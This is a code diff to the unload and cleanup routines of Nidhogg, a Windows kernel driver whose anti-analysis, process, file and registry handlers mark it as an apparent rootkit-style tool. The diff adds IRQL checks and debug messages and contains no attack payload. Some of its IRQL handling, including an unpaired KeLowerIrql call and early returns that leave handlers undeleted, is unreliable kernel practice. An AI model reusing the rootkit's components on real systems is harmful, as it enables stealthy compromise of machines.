@@ -151,7 +151,14 @@ NTSTATUS NidhoggEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
 void NidhoggUnload(PDRIVER_OBJECT DriverObject) {
 	Print(DRIVER_PREFIX "Unloading...\n");
 
-	if (Features.RegistryFeatures) {
+	KIRQL irql = KeGetCurrentIrql();
+
+	if (irql != PASSIVE_LEVEL) {
+		Print(DRIVER_PREFIX "ERROR: NidhoggUnload called at IRQL %d instead of PASSIVE_LEVEL\n", irql);
+		KeLowerIrql(PASSIVE_LEVEL);
+	}
+
+	if (Features.RegistryFeatures && NidhoggRegistryHandler->regCookie.QuadPart != 0) {
 		NTSTATUS status = CmUnRegisterCallback(NidhoggRegistryHandler->regCookie);
 
 		if (!NT_SUCCESS(status)) {
@@ -172,6 +179,13 @@ void NidhoggUnload(PDRIVER_OBJECT DriverObject) {
 		RegistrationHandle = NULL;
 	}
 	ClearAll();
+
+	irql = KeGetCurrentIrql();
+
+	if (irql != PASSIVE_LEVEL) {
+		Print(DRIVER_PREFIX "ERROR: IRQL changed to %d instead of PASSIVE_LEVEL\n", irql);
+		KeLowerIrql(PASSIVE_LEVEL);
+	}
 
 	UNICODE_STRING symbolicLink = RTL_CONSTANT_STRING(DRIVER_SYMBOLIC_LINK);
 	IoDeleteSymbolicLink(&symbolicLink);
@@ -235,35 +249,106 @@ void ExecuteInitialOperations() {
 * There is no return value.
 */
 void ClearAll() {
+	// Verify we're at PASSIVE_LEVEL before proceeding with cleanup
+	KIRQL currentIrql = KeGetCurrentIrql();
+	if (currentIrql != PASSIVE_LEVEL) {
+		Print(DRIVER_PREFIX "ERROR: ClearAll called at IRQL %d instead of PASSIVE_LEVEL\n", currentIrql);
+		return;
+	}
+
 	// Clear the handlers in reverse order of initialization to avoid dependency issues
 	if (NidhoggNetworkHandler) {
+		Print(DRIVER_PREFIX "Deleting NetworkHandler...\n");
 		delete NidhoggNetworkHandler;
 		NidhoggNetworkHandler = nullptr;
+		
+		// Check IRQL after deletion
+		currentIrql = KeGetCurrentIrql();
+		if (currentIrql != PASSIVE_LEVEL) {
+			Print(DRIVER_PREFIX "ERROR: IRQL changed to %d after deleting NetworkHandler\n", currentIrql);
+			return;
+		}
 	}
+	
 	if (NidhoggRegistryHandler) {
+		Print(DRIVER_PREFIX "Deleting RegistryHandler...\n");
 		delete NidhoggRegistryHandler;
 		NidhoggRegistryHandler = nullptr;
+		
+		// Check IRQL after deletion
+		currentIrql = KeGetCurrentIrql();
+		if (currentIrql != PASSIVE_LEVEL) {
+			Print(DRIVER_PREFIX "ERROR: IRQL changed to %d after deleting RegistryHandler\n", currentIrql);
+			return;
+		}
 	}
+	
 	if (NidhoggAntiAnalysisHandler) {
+		Print(DRIVER_PREFIX "Deleting AntiAnalysisHandler...\n");
 		delete NidhoggAntiAnalysisHandler;
 		NidhoggAntiAnalysisHandler = nullptr;
+		
+		// Check IRQL after deletion
+		currentIrql = KeGetCurrentIrql();
+		if (currentIrql != PASSIVE_LEVEL) {
+			Print(DRIVER_PREFIX "ERROR: IRQL changed to %d after deleting AntiAnalysisHandler\n", currentIrql);
+			return;
+		}
 	}
+	
 	if (NidhoggMemoryHandler) {
+		Print(DRIVER_PREFIX "Deleting MemoryHandler...\n");
 		delete NidhoggMemoryHandler;
 		NidhoggMemoryHandler = nullptr;
+		
+		// Check IRQL after deletion
+		currentIrql = KeGetCurrentIrql();
+		if (currentIrql != PASSIVE_LEVEL) {
+			Print(DRIVER_PREFIX "ERROR: IRQL changed to %d after deleting MemoryHandler\n", currentIrql);
+			return;
+		}
 	}
+	
 	if (NidhoggFileHandler) {
+		Print(DRIVER_PREFIX "Deleting FileHandler...\n");
 		delete NidhoggFileHandler;
 		NidhoggFileHandler = nullptr;
+		
+		// Check IRQL after deletion
+		currentIrql = KeGetCurrentIrql();
+		if (currentIrql != PASSIVE_LEVEL) {
+			Print(DRIVER_PREFIX "ERROR: IRQL changed to %d after deleting FileHandler\n", currentIrql);
+			return;
+		}
 	}
+	
 	if (NidhoggThreadHandler) {
+		Print(DRIVER_PREFIX "Deleting ThreadHandler...\n");
 		delete NidhoggThreadHandler;
 		NidhoggThreadHandler = nullptr;
+		
+		// Check IRQL after deletion
+		currentIrql = KeGetCurrentIrql();
+		if (currentIrql != PASSIVE_LEVEL) {
+			Print(DRIVER_PREFIX "ERROR: IRQL changed to %d after deleting ThreadHandler\n", currentIrql);
+			return;
+		}
 	}
+	
 	if (NidhoggProcessHandler) {
+		Print(DRIVER_PREFIX "Deleting ProcessHandler...\n");
 		delete NidhoggProcessHandler;
 		NidhoggProcessHandler = nullptr;
+		
+		// Check IRQL after deletion
+		currentIrql = KeGetCurrentIrql();
+		if (currentIrql != PASSIVE_LEVEL) {
+			Print(DRIVER_PREFIX "ERROR: IRQL changed to %d after deleting ProcessHandler\n", currentIrql);
+			return;
+		}
 	}
+	
+	Print(DRIVER_PREFIX "All handlers cleared successfully\n");
 }
 
 /*
